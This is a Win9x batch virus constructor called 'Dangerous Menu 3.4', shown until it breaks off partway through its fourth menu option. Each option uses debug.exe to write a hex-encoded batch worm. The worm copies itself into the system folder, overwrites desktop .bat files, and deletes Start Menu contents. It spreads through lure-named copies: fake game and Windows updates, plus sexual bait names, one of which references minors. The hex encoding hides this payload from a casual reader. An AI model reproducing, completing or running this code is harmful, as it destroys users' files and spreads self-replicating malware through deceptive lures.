@echo off
cls
@ver | find "XP"
if errorlevel 1 goto main
if not errorlevel 1 goto :XP
cls
:main
cls
echo.
echo.
echo.
echo.
echo.
echo              ษอออป           ษฤ    presenting    ฤป  by  DvL  ษอออป
echo              ณ   ฬอออออออออออผ Dangerous Menu 3.4 ศอออออออออออน   ณ
echo              ศอออน www.geocities.com/ratty_dvl/BATch/main.htm ฬอออผ
echo                  ศออออออออออออออออออออออออออออออออออออออออออออผ
echo.
echo             This constructor is dedicated to my special angel, Ioana
echo.
echo.
echo  Notes: - I`m not responsable for any damage caused by this constructor.
echo         - Created to work only on win9x systems.
echo.
echo.
echo    1 - EICAR
echo.
echo    2 - Fake bytes
echo.
echo    3 - EICAR and fake bytes
echo.
echo    4 - No fake bytes or EICAR string
echo.
echo    Q - e X i t
echo.
echo.
choice /c:1234Q>nul
if errorlevel 5 goto done
if errorlevel 4 goto a4
if errorlevel 3 goto a3
if errorlevel 2 goto a2
if errorlevel 1 goto a1
echo CHOICE missing
goto done

:a1
cls
ctty nul
@if exist ioana.txt deltree/y ioana.txt
@echo e 0100  58 35 4F 21 50 25 40 41 50 5B 34 5C 50 5A 58 35>>eicar
@echo e 0110  34 28 50 5E 29 37 43 43 29 37 7D 24 45 49 43 41>>eicar
@echo e 0120  52 2D 53 54 41 4E 44 41 52 44 2D 41 4E 54 49 56>>eicar
@echo e 0130  49 52 55 53 2D 54 45 53 54 2D 46 49 4C 45 21 24>>eicar
@echo e 0140  48 2B 48 2A 0D 0A 3A 3A 0D 0A 3A 3A 0D 0A 3A 3A>>eicar
@echo e 0150  20 47 65 6E 65 72 61 74 65 64 20 62 79 20 44 61>>eicar
@echo e 0160  6E 67 65 72 6F 75 73 20 4D 65 6E 75 20 5B 44 76>>eicar
@echo e 0170  4C 5D 0D 0A 3A 3A 0D 0A 3A 3A 0D 0A 63 74 74 79>>eicar
@echo e 0180  20 6E 75 6C 0D 0A 40 65 63 68 6F 20 6F 66 66 0D>>eicar
@echo e 0190  0A 40 64 65 6C 74 72 65 65 2F 79 20 25 77 69 6E>>eicar
@echo e 01A0  64 69 72 25 5C 73 79 73 74 65 6D 5C 69 6F 61 6E>>eicar
@echo e 01B0  61 20 3E 6E 75 6C 0D 0A 40 6D 64 20 25 77 69 6E>>eicar
@echo e 01C0  64 69 72 25 5C 73 79 73 74 65 6D 5C 69 6F 61 6E>>eicar
@echo e 01D0  61 0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69 6E>>eicar
@echo e 01E0  64 69 72 25 5C 73 79 73 74 65 6D 5C 69 6F 61 6E>>eicar
@echo e 01F0  61 5C 69 6F 61 6E 61 2E 62 61 74 0D 0A 40 66 6F>>eicar
@echo e 0200  72 20 25 25 75 20 69 6E 20 28 25 77 69 6E 64 69>>eicar
@echo e 0210  72 25 5C 64 65 73 6B 74 6F 70 5C 2A 2E 62 61 74>>eicar
@echo e 0220  29 20 64 6F 20 63 6F 70 79 20 25 77 69 6E 64 69>>eicar
@echo e 0230  72 25 5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61 5C>>eicar
@echo e 0240  69 6F 61 6E 61 2E 62 61 74 20 25 25 75 0D 0A 40>>eicar
@echo e 0250  63 6F 70 79 20 25 30 20 25 77 69 6E 64 69 72 25>>eicar
@echo e 0260  5C 64 65 73 6B 74 6F 70 5C 22 4C 6F 6E 65 6C 79>>eicar
@echo e 0270  20 47 69 72 6C 73 20 46 6F 72 20 59 6F 75 72 20>>eicar
@echo e 0280  50 6C 65 61 73 75 72 65 2E 75 72 6C 2E 62 61 74>>eicar
@echo e 0290  22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30>>eicar
@echo e 02A0  20 25 77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F>>eicar
@echo e 02B0  70 5C 22 4C 6F 6C 69 74 61 20 62 6C 6F 77 73 20>>eicar
@echo e 02C0  69 74 2E 6A 70 67 2E 62 61 74 22 20 3E 6E 75 6C>>eicar
@echo e 02D0  0D 0A 40 63 6F 70 79 20 25 30 20 63 3A 5C 6D 79>>eicar
@echo e 02E0  64 6F 63 75 7E 31 5C 22 53 65 78 2C 20 4D 6F 6E>>eicar
@echo e 02F0  65 79 20 61 6E 64 20 50 6F 77 65 72 2E 64 6F 63>>eicar
@echo e 0300  2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63 6F 70>>eicar
@echo e 0310  79 20 25 30 20 63 3A 5C 6D 79 64 6F 63 75 7E 31>>eicar
@echo e 0320  5C 22 57 61 72 63 72 61 66 74 20 33 20 75 70 64>>eicar
@echo e 0330  61 74 65 2E 65 78 65 2E 62 61 74 22 20 3E 6E 75>>eicar
@echo e 0340  6C 0D 0A 40 64 65 6C 74 72 65 65 2F 79 20 25 77>>eicar
@echo e 0350  69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70 5C 73>>eicar
@echo e 0360  74 61 72 74 6D 7E 31 5C 2A 2E 2A 20 3E 6E 75 6C>>eicar
@echo e 0370  0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69 6E 64>>eicar
@echo e 0380  69 72 25 5C 64 65 73 6B 74 6F 70 5C 73 74 61 72>>eicar
@echo e 0390  74 6D 7E 31 5C 22 57 69 6E 64 6F 77 73 20 55 70>>eicar
@echo e 03A0  64 61 74 65 2E 65 78 65 2E 62 61 74 22 20 3E 6E>>eicar
@echo e 03B0  75 6C 0D 0A 00>>eicar
@echo rcx>>eicar
@echo 2B4>>eicar
@echo n txt>>eicar
@echo w>>eicar
@echo q>>eicar
@debug<eicar
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y eicar >nul
ctty con
cls
goto 001

:a2
cls
ctty nul
@if exist ioana.txt deltree/y ioana.txt
@echo e 0100  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0110  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0120  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0130  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0140  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0150  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 0D>>fake
@echo e 0160  0A 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0170  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0180  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0190  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01C0  0D 0A 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 01F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0200  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0210  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0220  31 0D 0A 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0230  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0240  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0250  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0260  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0270  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0280  31 30 0D 0A 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0290  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02E0  31 30 31 0D 0A 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 02F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0300  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0310  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0320  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0330  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0340  31 30 31 30 0D 0A 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0350  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0360  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0370  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0380  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0390  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03A0  31 30 31 30 31 0D 0A 30 31 30 31 30 31 30 31 30>>fake
@echo e 03B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03C0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 03F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0400  31 30 31 30 31 30 0D 0A 31 30 31 30 31 30 31 30>>fake
@echo e 0410  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0420  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0430  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0440  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0450  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0460  31 30 31 30 31 30 31 0D 0A 30 31 30 31 30 31 30>>fake
@echo e 0470  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0480  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0490  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04A0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04B0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04C0  31 30 31 30 31 30 31 30 0D 0A 31 30 31 30 31 30>>fake
@echo e 04D0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04E0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 04F0  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0500  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0510  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0520  31 30 31 30 31 30 31 30 31 0D 0A 30 31 30 31 30>>fake
@echo e 0530  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0540  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0550  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0560  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0570  31 30 31 30 31 30 31 30 31 30 31 30 31 30 31 30>>fake
@echo e 0580  31 30 31 30 31 30 31 30 31 30 0D 0A 3A 3A 0D 0A>>fake
@echo e 0590  3A 3A 0D 0A 3A 3A 20 47 65 6E 65 72 61 74 65 64>>fake
@echo e 05A0  20 62 79 20 44 61 6E 67 65 72 6F 75 73 20 4D 65>>fake
@echo e 05B0  6E 75 20 5B 44 76 4C 5D 0D 0A 3A 3A 0D 0A 3A 3A>>fake
@echo e 05C0  0D 0A 63 74 74 79 20 6E 75 6C 0D 0A 40 65 63 68>>fake
@echo e 05D0  6F 20 6F 66 66 0D 0A 40 64 65 6C 74 72 65 65 2F>>fake
@echo e 05E0  79 20 25 77 69 6E 64 69 72 25 5C 73 79 73 74 65>>fake
@echo e 05F0  6D 5C 69 6F 61 6E 61 20 3E 6E 75 6C 0D 0A 40 6D>>fake
@echo e 0600  64 20 25 77 69 6E 64 69 72 25 5C 73 79 73 74 65>>fake
@echo e 0610  6D 5C 69 6F 61 6E 61 0D 0A 40 63 6F 70 79 20 25>>fake
@echo e 0620  30 20 25 77 69 6E 64 69 72 25 5C 73 79 73 74 65>>fake
@echo e 0630  6D 5C 69 6F 61 6E 61 5C 69 6F 61 6E 61 2E 62 61>>fake
@echo e 0640  74 0D 0A 40 66 6F 72 20 25 25 75 20 69 6E 20 28>>fake
@echo e 0650  25 77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70>>fake
@echo e 0660  5C 2A 2E 62 61 74 29 20 64 6F 20 63 6F 70 79 20>>fake
@echo e 0670  25 77 69 6E 64 69 72 25 5C 73 79 73 74 65 6D 5C>>fake
@echo e 0680  69 6F 61 6E 61 5C 69 6F 61 6E 61 2E 62 61 74 20>>fake
@echo e 0690  25 25 75 0D 0A 40 63 6F 70 79 20 25 30 20 25 77>>fake
@echo e 06A0  69 6E 64 69 72 25 5C 64 65 73 6B 74 6F 70 5C 22>>fake
@echo e 06B0  4C 6F 6E 65 6C 79 20 47 69 72 6C 73 20 46 6F 72>>fake
@echo e 06C0  20 59 6F 75 72 20 50 6C 65 61 73 75 72 65 2E 75>>fake
@echo e 06D0  72 6C 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63>>fake
@echo e 06E0  6F 70 79 20 25 30 20 25 77 69 6E 64 69 72 25 5C>>fake
@echo e 06F0  64 65 73 6B 74 6F 70 5C 22 4C 6F 6C 69 74 61 20>>fake
@echo e 0700  62 6C 6F 77 73 20 69 74 2E 6A 70 67 2E 62 61 74>>fake
@echo e 0710  22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30>>fake
@echo e 0720  20 63 3A 5C 6D 79 64 6F 63 75 7E 31 5C 22 53 65>>fake
@echo e 0730  78 2C 20 4D 6F 6E 65 79 20 61 6E 64 20 50 6F 77>>fake
@echo e 0740  65 72 2E 64 6F 63 2E 62 61 74 22 20 3E 6E 75 6C>>fake
@echo e 0750  0D 0A 40 63 6F 70 79 20 25 30 20 63 3A 5C 6D 79>>fake
@echo e 0760  64 6F 63 75 7E 31 5C 22 57 61 72 63 72 61 66 74>>fake
@echo e 0770  20 33 20 75 70 64 61 74 65 2E 65 78 65 2E 62 61>>fake
@echo e 0780  74 22 20 3E 6E 75 6C 0D 0A 40 64 65 6C 74 72 65>>fake
@echo e 0790  65 2F 79 20 25 77 69 6E 64 69 72 25 5C 64 65 73>>fake
@echo e 07A0  6B 74 6F 70 5C 73 74 61 72 74 6D 7E 31 5C 2A 2E>>fake
@echo e 07B0  2A 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30>>fake
@echo e 07C0  20 25 77 69 6E 64 69 72 25 5C 64 65 73 6B 74 6F>>fake
@echo e 07D0  70 5C 73 74 61 72 74 6D 7E 31 5C 22 57 69 6E 64>>fake
@echo e 07E0  6F 77 73 20 55 70 64 61 74 65 2E 65 78 65 2E 62>>fake
@echo e 07F0  61 74 22 20 3E 6E 75 6C 0D 0A 00>>fake
@echo rcx>>fake
@echo 6FA>>fake
@echo n txt>>fake
@echo w>>fake
@echo q>>fake
@debug<fake
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y fake >nul
ctty con
cls
goto 001

:a3
cls
ctty nul
@if exist ioana.txt deltree/y ioana.txt
@echo e 0100  58 35 4F 21 50 25 40 41 50 5B 34 5C 50 5A 58 35>>both
@echo e 0110  34 28 50 5E 29 37 43 43 29 37 7D 24 45 49 43 41>>both
@echo e 0120  52 2D 53 54 41 4E 44 41 52 44 2D 41 4E 54 49 56>>both
@echo e 0130  49 52 55 53 2D 54 45 53 54 2D 46 49 4C 45 21 24>>both
@echo e 0140  48 2B 48 2A 0D 0A 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0150  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0160  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0170  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0180  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0190  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 01A0  30 31 30 31 30 0D 0A 31 30 31 30 31 30 31 30 31>>both
@echo e 01B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 01C0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 01D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 01E0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 01F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0200  30 31 30 31 30 31 0D 0A 30 31 30 31 30 31 30 31>>both
@echo e 0210  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0220  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0230  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0240  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0250  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0260  30 31 30 31 30 31 30 0D 0A 31 30 31 30 31 30 31>>both
@echo e 0270  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0280  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0290  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 02A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 02B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 02C0  30 31 30 31 30 31 30 31 0D 0A 30 31 30 31 30 31>>both
@echo e 02D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 02E0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 02F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0300  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0310  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0320  30 31 30 31 30 31 30 31 30 0D 0A 31 30 31 30 31>>both
@echo e 0330  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0340  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0350  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0360  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0370  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0380  30 31 30 31 30 31 30 31 30 31 0D 0A 30 31 30 31>>both
@echo e 0390  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 03A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 03B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 03C0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 03D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 03E0  30 31 30 31 30 31 30 31 30 31 30 0D 0A 31 30 31>>both
@echo e 03F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0400  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0410  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0420  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0430  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0440  30 31 30 31 30 31 30 31 30 31 30 31 0D 0A 30 31>>both
@echo e 0450  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0460  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0470  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0480  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0490  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 04A0  30 31 30 31 30 31 30 31 30 31 30 31 30 0D 0A 31>>both
@echo e 04B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 04C0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 04D0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 04E0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 04F0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0500  30 31 30 31 30 31 30 31 30 31 30 31 30 31 0D 0A>>both
@echo e 0510  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0520  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0530  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0540  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0550  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0560  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 0D>>both
@echo e 0570  0A 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0580  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 0590  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 05A0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 05B0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 05C0  30 31 30 31 30 31 30 31 30 31 30 31 30 31 30 31>>both
@echo e 05D0  0D 0A 3A 3A 0D 0A 3A 3A 0D 0A 3A 3A 20 47 65 6E>>both
@echo e 05E0  65 72 61 74 65 64 20 62 79 20 44 61 6E 67 65 72>>both
@echo e 05F0  6F 75 73 20 4D 65 6E 75 20 5B 44 76 4C 5D 0D 0A>>both
@echo e 0600  3A 3A 0D 0A 3A 3A 0D 0A 63 74 74 79 20 6E 75 6C>>both
@echo e 0610  0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A 40 64 65>>both
@echo e 0620  6C 74 72 65 65 2F 79 20 25 77 69 6E 64 69 72 25>>both
@echo e 0630  5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61 20 3E 6E>>both
@echo e 0640  75 6C 0D 0A 40 6D 64 20 25 77 69 6E 64 69 72 25>>both
@echo e 0650  5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61 0D 0A 40>>both
@echo e 0660  63 6F 70 79 20 25 30 20 25 77 69 6E 64 69 72 25>>both
@echo e 0670  5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61 5C 69 6F>>both
@echo e 0680  61 6E 61 2E 62 61 74 0D 0A 40 66 6F 72 20 25 25>>both
@echo e 0690  75 20 69 6E 20 28 25 77 69 6E 64 69 72 25 5C 64>>both
@echo e 06A0  65 73 6B 74 6F 70 5C 2A 2E 62 61 74 29 20 64 6F>>both
@echo e 06B0  20 63 6F 70 79 20 25 77 69 6E 64 69 72 25 5C 73>>both
@echo e 06C0  79 73 74 65 6D 5C 69 6F 61 6E 61 5C 69 6F 61 6E>>both
@echo e 06D0  61 2E 62 61 74 20 25 25 75 0D 0A 40 63 6F 70 79>>both
@echo e 06E0  20 25 30 20 25 77 69 6E 64 69 72 25 5C 64 65 73>>both
@echo e 06F0  6B 74 6F 70 5C 22 4C 6F 6E 65 6C 79 20 47 69 72>>both
@echo e 0700  6C 73 20 46 6F 72 20 59 6F 75 72 20 50 6C 65 61>>both
@echo e 0710  73 75 72 65 2E 75 72 6C 2E 62 61 74 22 20 3E 6E>>both
@echo e 0720  75 6C 0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69>>both
@echo e 0730  6E 64 69 72 25 5C 64 65 73 6B 74 6F 70 5C 22 4C>>both
@echo e 0740  6F 6C 69 74 61 20 62 6C 6F 77 73 20 69 74 2E 6A>>both
@echo e 0750  70 67 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40 63>>both
@echo e 0760  6F 70 79 20 25 30 20 63 3A 5C 6D 79 64 6F 63 75>>both
@echo e 0770  7E 31 5C 22 53 65 78 2C 20 4D 6F 6E 65 79 20 61>>both
@echo e 0780  6E 64 20 50 6F 77 65 72 2E 64 6F 63 2E 62 61 74>>both
@echo e 0790  22 20 3E 6E 75 6C 0D 0A 40 63 6F 70 79 20 25 30>>both
@echo e 07A0  20 63 3A 5C 6D 79 64 6F 63 75 7E 31 5C 22 57 61>>both
@echo e 07B0  72 63 72 61 66 74 20 33 20 75 70 64 61 74 65 2E>>both
@echo e 07C0  65 78 65 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A 40>>both
@echo e 07D0  64 65 6C 74 72 65 65 2F 79 20 25 77 69 6E 64 69>>both
@echo e 07E0  72 25 5C 64 65 73 6B 74 6F 70 5C 73 74 61 72 74>>both
@echo e 07F0  6D 7E 31 5C 2A 2E 2A 20 3E 6E 75 6C 0D 0A 40 63>>both
@echo e 0800  6F 70 79 20 25 30 20 25 77 69 6E 64 69 72 25 5C>>both
@echo e 0810  64 65 73 6B 74 6F 70 5C 73 74 61 72 74 6D 7E 31>>both
@echo e 0820  5C 22 57 69 6E 64 6F 77 73 20 55 70 64 61 74 65>>both
@echo e 0830  2E 65 78 65 2E 62 61 74 22 20 3E 6E 75 6C 0D 0A>>both
@echo e 0840  00>>both
@echo rcx>>both
@echo 740>>both
@echo n txt>>both
@echo w>>both
@echo q>>both
@debug<both
@ren txt ioana.txt
@deltree/y txt >nul
@deltree/y both >nul
ctty con
cls
goto 001

:a4
cls
ctty nul
@if exist ioana.txt deltree/y ioana.txt
@echo e 0100  3A 3A 20 6E 6F 20 66 61 6B 65 20 62 79 74 65 73>>nofbe
@echo e 0110  20 6F 72 20 45 49 43 41 52 20 73 74 72 69 6E 67>>nofbe
@echo e 0120  0D 0A 3A 3A 0D 0A 3A 3A 0D 0A 3A 3A 20 47 65 6E>>nofbe
@echo e 0130  65 72 61 74 65 64 20 62 79 20 44 61 6E 67 65 72>>nofbe
@echo e 0140  6F 75 73 20 4D 65 6E 75 20 5B 44 76 4C 5D 0D 0A>>nofbe
@echo e 0150  3A 3A 0D 0A 3A 3A 0D 0A 63 74 74 79 20 6E 75 6C>>nofbe
@echo e 0160  0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A 40 64 65>>nofbe
@echo e 0170  6C 74 72 65 65 2F 79 20 25 77 69 6E 64 69 72 25>>nofbe
@echo e 0180  5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61 20 3E 6E>>nofbe
@echo e 0190  75 6C 0D 0A 40 6D 64 20 25 77 69 6E 64 69 72 25>>nofbe
@echo e 01A0  5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61 0D 0A 40>>nofbe
@echo e 01B0  63 6F 70 79 20 25 30 20 25 77 69 6E 64 69 72 25>>nofbe
@echo e 01C0  5C 73 79 73 74 65 6D 5C 69 6F 61 6E 61 5C 69 6F>>nofbe
@echo e 01D0  61 6E 61 2E 62 61 74 0D 0A 40 66 6F 72 20 25 25>>nofbe
@echo e 01E0  75 20 69 6E 20 28 25 77 69 6E 64 69 72 25 5C 64>>nofbe
@echo e 01F0  65 73 6B 74 6F 70 5C 2A 2E 62 61 74 29 20 64 6F>>nofbe
@echo e 0200  20 63 6F 70 79 20 25 77 69 6E 64 69 72 25 5C 73>>nofbe
@echo e 0210  79 73 74 65 6D 5C 69 6F 61 6E 61 5C 69 6F 61 6E>>nofbe
@echo e 0220  61 2E 62 61 74 20 25 25 75 0D 0A 40 63 6F 70 79>>nofbe
@echo e 0230  20 25 30 20 25 77 69 6E 64 69 72 25 5C 64 65 73>>nofbe
@echo e 0240  6B 74 6F 70 5C 22 4C 6F 6E 65 6C 79 20 47 69 72>>nofbe
@echo e 0250  6C 73 20 46 6F 72 20 59 6F 75 72 20 50 6C 65 61>>nofbe
@echo e 0260  73 75 72 65 2E 75 72 6C 2E 62 61 74 22 20 3E 6E>>nofbe
@echo e 0270  75 6C 0D 0A 40 63 6F 70 79 20 25 30 20 25 77 69>>nofbe
@echo e 0280  6E 64 69 72 25 5C 64 65 73 6B 74 6F 70 5C 22 4C>>nofbe
@echo e 0290  6F 6C 69 74 61 20 62 6C 6F 77 73 20 69 74 2E 6A>>nofbe
